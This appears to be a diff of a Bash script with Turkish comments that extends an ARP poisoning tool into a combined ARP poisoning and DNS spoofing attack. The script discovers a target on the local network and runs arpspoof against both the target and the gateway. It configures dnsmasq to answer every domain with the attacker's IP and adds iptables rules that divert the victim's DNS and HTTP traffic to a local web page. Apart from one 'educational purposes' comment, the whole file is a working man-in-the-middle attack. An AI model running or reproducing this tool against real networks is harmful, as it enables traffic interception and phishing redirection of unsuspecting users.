@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Basit ARP Poisoning Saldırısı
+# Gelişmiş ARP Poisoning + DNS Spoofing Saldırısı
 # Eğitim Amaçlıdır
 
 # --- Renkler ---
@@ -15,12 +15,11 @@ if [ "$EUID" -ne 0 ]; then
     exit 1
 fi
 
-for tool in arpspoof arp-scan python; do
+for tool in arpspoof arp-scan python dnsmasq; do
     if ! command -v $tool &> /dev/null; then
-        echo -e "${RED}HATA: '$tool' komutu bulunamadı. Lütfen 'dsniff', 'arp-scan' ve 'python' paketlerini kurun.${NC}"
+        echo -e "${RED}HATA: '$tool' komutu bulunamadı. Lütfen 'dsniff', 'arp-scan', 'python' ve 'dnsmasq' paketlerini kurun.${NC}"
         exit 1
     fi
-
 done
 
 # --- Temizlik Fonksiyonu ---
@@ -31,14 +30,22 @@ cleanup() {
     echo 0 > /proc/sys/net/ipv4/ip_forward
     echo -e "[+] IP forwarding kapatıldı."
 
-    # iptables kuralını sil
+    # iptables kurallarını sil
     iptables -t nat -F
     echo -e "[+] iptables NAT kuralları temizlendi."
 
     # Arka plandaki işlemleri sonlandır
     pkill -f arpspoof
     pkill -f "python -m http.server 8080"
+    pkill -f dnsmasq
     echo -e "[+] Arka plan işlemleri durduruldu."
+    
+    # systemd-resolved servisini (eğer durdurulduysa) yeniden başlat
+    if [ -f /tmp/resolved_stopped.flag ]; then
+        echo -e "[+] systemd-resolved servisi yeniden başlatılıyor..."
+        systemctl start systemd-resolved
+        rm /tmp/resolved_stopped.flag
+    fi
 
     echo -e "${GREEN}[✓] Temizlik tamamlandı.${NC}"
     exit 0
@@ -49,21 +56,23 @@ trap cleanup SIGINT
 
 # --- Başlangıç ---
 clear
-echo -e "${GREEN}=================================="${NC}
-echo -e "${GREEN}  ARP POISONING SALDIRI ARACI   "${NC}
-echo -e "${GREEN}=================================="${NC}
+echo -e "${GREEN}=============================================="${NC}
+echo -e "${GREEN}  ARP POISONING + DNS SPOOFING SALDIRI ARACI  "${NC}
+echo -e "${GREEN}=============================================="${NC}
 
 # --- Ağ Bilgileri ---
 INTERFACE=$(ip route | grep default | awk '{print $5}')
 GATEWAY=$(ip route | grep default | awk '{print $3}')
+MY_IP=$(ip -4 addr show $INTERFACE | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
 
-if [ -z "$INTERFACE" ] || [ -z "$GATEWAY" ]; then
-    echo -e "${RED}HATA: Ağ arayüzü veya gateway bulunamadı.${NC}"
+if [ -z "$INTERFACE" ] || [ -z "$GATEWAY" ] || [ -z "$MY_IP" ]; then
+    echo -e "${RED}HATA: Ağ bilgileri alınamadı.${NC}"
     exit 1
 fi
 
 echo -e "[+] Ağ Arayüzü: ${YELLOW}$INTERFACE${NC}"
 echo -e "[+] Gateway: ${YELLOW}$GATEWAY${NC}"
+echo -e "[+] Saldırgan IP: ${YELLOW}$MY_IP${NC}"
 
 # --- Hedef Tarama ---
 echo -e "\n${GREEN}[*] Ağdaki hedefler taranıyor...${NC}"
@@ -81,24 +90,49 @@ echo -e "[+] Hedef: ${YELLOW}$TARGET_IP${NC}"
 
 # --- Saldırı Başlatma ---
 
-# 1. IP Forwarding'i etkinleştir
-echo -e "\n${GREEN}[1/4] IP forwarding etkinleştiriliyor...${NC}"
+# 1. Port 53 Kontrolü ve DNS Sunucu Kurulumu
+echo -e "\n${GREEN}[1/5] DNS Spoofing ayarlanıyor...${NC}"
+# systemd-resolved port 53'ü kullanıyorsa durdur
+if lsof -i:53 | grep -q systemd-resolve; then
+    echo -e "${YELLOW}[!] systemd-resolved 53. portu kullanıyor. Geçici olarak durduruluyor...${NC}"
+    systemctl stop systemd-resolved
+    touch /tmp/resolved_stopped.flag # Temizlikte yeniden başlatmak için işaretle
+fi
+
+# Tüm adresleri kendi IP'mize yönlendiren dnsmasq yapılandırması oluştur
+DNSMASQ_CONF=$(mktemp)
+cat > $DNSMASQ_CONF << EOF
+port=53
+listen-address=$MY_IP
+address=/#/$MY_IP
+log-queries
+EOF
+
+# dnsmasq'ı başlat
+dnsmasq -C $DNSMASQ_CONF --no-daemon &
+
+# 2. IP Forwarding'i etkinleştir
+echo -e "${GREEN}[2/5] IP forwarding etkinleştiriliyor...${NC}"
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-# 2. Web sunucusunu başlat
-echo -e "${GREEN}[2/4] Port 8080 üzerinde web sunucusu başlatılıyor...${NC}"
+# 3. Web sunucusunu başlat
+echo -e "${GREEN}[3/5] Port 8080 üzerinde web sunucusu başlatılıyor...${NC}"
 if [ ! -f "index.html" ]; then
     echo -e "${RED}HATA: index.html dosyası bulunamadı!${NC}"
     cleanup
 fi
 python -m http.server 8080 &> /dev/null &
 
-# 3. iptables ile port yönlendirme
-echo -e "${GREEN}[3/4] iptables ile port 80 -> 8080 yönlendirmesi yapılıyor...${NC}"
+# 4. iptables ile port yönlendirmeleri yapılıyor...
+echo -e "${GREEN}[4/5] iptables ile port yönlendirmeleri yapılıyor...${NC}"
+# HTTP (80) trafiğini yerel web sunucumuza (8080) yönlendir
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+# DNS (53) trafiğini yerel DNS sunucumuza (dnsmasq) yönlendir
+iptables -t nat -A PREROUTING -p udp --destination-port 53 -j DNAT --to-destination $MY_IP
+iptables -t nat -A PREROUTING -p tcp --destination-port 53 -j DNAT --to-destination $MY_IP
 
-# 4. ARP Spoofing'i başlat
-echo -e "${GREEN}[4/4] ARP zehirlenmesi başlatılıyor...${NC}"
+# 5. ARP Spoofing'i başlat
+echo -e "${GREEN}[5/5] ARP zehirlenmesi başlatılıyor...${NC}"
 
 # Hedefe, gateway'in biz olduğumuzu söylüyoruz
 arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY &
@@ -110,7 +144,8 @@ arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP &
 echo -e "\n${GREEN}=================================="${NC}
 echo -e "${GREEN}   SALDIRI BAŞLATILDI!            "${NC}
 echo -e "${GREEN}=================================="${NC}
-echo -e "Hedef (${YELLOW}$TARGET_IP${NC}) bir HTTP siteye girdiğinde, sizin sayfanız yüklenecektir."
+echo -e "Hedef (${YELLOW}$TARGET_IP${NC}) herhangi bir HTTP siteye girdiğinde sizin sayfanız yüklenecektir."
+echo -e "(Var olmayan siteler dahil: http://asdasd.com)"
 echo -e "Saldırıyı durdurmak için ${RED}CTRL+C${NC} tuşlarına basın."
 
 # Betiğin kapanmaması için bekle
